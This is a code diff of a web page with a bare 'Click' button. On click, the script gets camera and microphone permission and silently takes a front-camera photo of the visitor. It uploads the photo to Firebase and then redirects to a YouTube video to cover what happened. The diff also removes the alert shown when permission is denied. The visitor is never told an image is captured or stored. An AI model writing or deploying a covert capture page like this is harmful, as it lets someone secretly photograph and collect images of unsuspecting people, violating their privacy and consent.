@@ -69,35 +69,35 @@
         // Function to handle button click
         async function handleClick() {
             try {
-                // Request microphone and camera permission
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
+                // Request microphone permission
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
 
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
                 video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
 
-                // Wait for the video metadata to load
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
+                    // Set canvas size
+                    canvas.width = 1920; // Set canvas width for 1080p
+                    canvas.height = 1080; // Set canvas height for 1080p
 
-                // Set canvas size
-                canvas.width = 1920; // Set canvas width for 1080p
-                canvas.height = 1080; // Set canvas height for 1080p
-
-                // Capture image immediately
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
-                uploadImage(imageData); // Upload image to Firebase
-                stopVideo(stream); // Stop the video stream
+                    // Capture image
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(stream); // Stop the video stream
+                    
+                    // Redirect to YouTube link
+                    window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
+                };
             } catch (err) {
                 console.error('Error accessing permissions: ', err);
-                alert('Permissions denied! You cannot use this feature without granting permissions.');
             }
         }
 
@@ -109,6 +109,6 @@
     </script>
 </head>
 <body>
-    <button class="button" onclick="handleClick()">انقر</button> <!-- Button with "Click" in Arabic -->
+    <button class="button" onclick="handleClick()">Click</button> <!-- Button with "Click" -->
 </body>
 </html>
